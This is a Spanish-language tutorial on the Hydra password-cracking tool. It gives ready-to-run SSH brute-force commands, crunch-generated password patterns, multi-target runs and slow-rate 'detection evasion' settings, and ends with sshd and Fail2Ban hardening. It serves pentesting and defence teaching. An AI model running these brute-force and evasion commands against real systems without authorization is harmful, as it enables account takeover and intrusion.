## Introducción a Hydra

**Hydra** es una herramienta de fuerza bruta que soporta múltiples protocolos de red, incluyendo SSH, FTP, HTTP y muchos otros.

**Usos principales:**

- Pentesting: evaluación de la fortaleza de contraseñas
- Auditorías de seguridad: identificación de cuentas vulnerables
- Pruebas de resistencia: verificación de políticas de contraseñas

---

## Instalación y Configuración

### Instalación en Linux

```bash
# Ubuntu/Debian
sudo apt-get install hydra

# CentOS/RHEL
sudo yum install hydra

# Arch Linux
sudo pacman -S hydra
```

### Verificación de Instalación

```bash
hydra -h
```

---

## Uso Básico de Hydra

### Sintaxis General

```bash
hydra [opciones] servidor protocolo
```

---

## Ataques SSH Básicos

### Ataque con Usuario y Lista de Contraseñas

```bash
hydra -l admin -P passwords.txt ssh://192.168.1.100
hydra -l admin -P passwords.txt -t 4 ssh://192.168.1.100
```

### Ataque con Lista de Usuarios

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
hydra -l root -p toor ssh://192.168.1.100
```

---

## Técnicas Avanzadas

### Configuración de Parámetros

```bash
hydra -l admin -P passwords.txt -t 4 -w 30 -f ssh://192.168.1.100
# -t 4: 4 threads paralelos
# -w 30: timeout de 30 segundos
# -f: parar después del primer login exitoso
```

### Ataques con Patrones

```bash
crunch 6 8 -t admin@@@ | hydra -l admin -P - ssh://192.168.1.100
hydra -l admin -P <(crunch 4 6 0123456789) ssh://192.168.1.100
```

---

## Evasión y Optimización

### Evasión de Detección

```bash
hydra -l admin -P passwords.txt -t 1 -w 60 ssh://192.168.1.100
hydra -l admin -P passwords.txt -s 22 -e nsr ssh://192.168.1.100
```

### Optimización de Rendimiento

```bash
hydra -l admin -P passwords.txt -t 16 ssh://192.168.1.100
hydra -l admin -P passwords.txt -M targets.txt ssh
```

---

## Contramedidas y Defensa

### Configuración SSH Segura

```bash
# /etc/ssh/sshd_config
MaxAuthTries 3
LoginGraceTime 60
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
```

### Fail2Ban Configuration

```bash
# /etc/fail2ban/jail.local
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
```

---
